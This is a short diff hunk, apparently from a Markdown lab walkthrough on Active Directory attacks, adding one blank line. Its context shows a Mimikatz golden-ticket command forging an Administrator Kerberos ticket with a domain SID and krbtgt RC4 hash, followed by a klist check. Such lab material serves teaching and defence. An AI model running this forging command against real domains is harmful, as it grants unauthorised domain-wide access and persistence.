@@ -234,6 +234,7 @@ PS C:\Users\bob\Downloads> Get-DomainSID
 `
 mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
 `
+
 4. The output shows that Mimikatz injected the ticket in the current session, and we can verify that by running the command klist (after exiting from Mimikatz):
 
 `C:\Mimikatz>klist`
